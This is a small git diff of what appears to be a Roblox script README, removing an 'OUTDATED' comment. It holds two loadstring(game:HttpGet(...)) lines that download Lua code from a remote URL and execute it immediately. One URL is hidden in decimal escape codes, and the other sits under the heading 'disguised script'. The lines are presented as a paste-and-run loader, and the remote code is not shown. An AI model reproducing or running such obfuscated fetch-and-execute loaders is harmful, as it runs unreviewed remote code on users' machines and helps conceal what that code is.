@@ -11,6 +11,5 @@ loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\103\105\116\104\117\98\46
 
 ## disguised script:
 ```lua
--- OUTDATED
 loadstring(game:HttpGet("https://github.com/juhoa-fr/universal/raw/main/sc"))()
 ```
